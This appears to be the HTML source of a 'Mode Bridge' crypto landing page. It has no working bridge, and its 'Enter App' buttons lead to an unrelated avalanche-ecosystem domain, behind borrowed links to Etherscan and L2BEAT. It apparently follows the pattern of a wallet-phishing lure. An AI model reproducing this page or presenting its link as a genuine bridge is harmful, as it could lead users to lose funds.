<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Mode Bridge</title>
  <meta name="description" content="Mode Bridge moves ETH and tokens between Ethereum and the Mode L2 from your own wallet.">
  <link rel="canonical" href="https://mode-bridge.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F6F1">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Mode Bridge">
  <meta property="og:description" content="Mode Bridge moves ETH and tokens between Ethereum and the Mode L2 from your own wallet.">
  <meta property="og:url" content="https://mode-bridge.github.io/">
  <meta property="og:image" content="https://mode-bridge.github.io/og-cover.png">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Mode Bridge">
  <meta name="twitter:description" content="Mode Bridge moves ETH and tokens between Ethereum and the Mode L2 from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://mode-bridge.github.io/#website",
        "url": "https://mode-bridge.github.io/",
        "name": "Mode Bridge",
        "inLanguage": "en"
      },
      {
        "@type": "Organization",
        "@id": "https://mode-bridge.github.io/#organization",
        "name": "Mode Bridge",
        "url": "https://mode-bridge.github.io/"
      },
      {
        "@type": "WebApplication",
        "@id": "https://mode-bridge.github.io/#app",
        "name": "Mode Bridge",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://mode-bridge.github.io/",
        "offers": {
          "@type": "Offer",
          "price": "0",
          "priceCurrency": "USD"
        }
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <div class="brand" aria-label="Mode Bridge">
      <img src="favicon.png" width="28" height="28" alt="">
      <span>Mode Bridge</span>
    </div>
    <nav class="nav" aria-label="Authority references">
      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Ethereum bridges</a>
      <a href="https://l2beat.com/scaling/projects/mode" target="_blank" rel="nofollow noopener noreferrer">L2BEAT</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-labelledby="page-title">
      <h1 id="page-title">Mode Bridge</h1>
      <p class="sub"><strong>Mode Bridge</strong> moves ETH and tokens between Ethereum and the Mode L2 from your own wallet.</p>
    </section>

    <section class="app-card" aria-label="Bridge route">
      <div class="route">
        <div class="leg">
          <span class="label">From</span>
          <span class="chip">
            <img src="eth.png" width="30" height="30" alt="Ethereum">
            <span>Ethereum</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Switch direction">
          <span aria-hidden="true">&rarr;</span>
        </button>
        <div class="leg">
          <span class="label">To</span>
          <span class="chip">
            <img src="mode.png" width="30" height="30" alt="Mode">
            <span>Mode</span>
          </span>
        </div>
      </div>
      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
    </section>
  </main>

  <footer class="footer">Mode Bridge &mdash; 2026</footer>

  <script>
  (function () {
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;
    button.addEventListener("click", function () {
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length !== 2) return;
      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
    });
  }());
  </script>
</body>
</html>
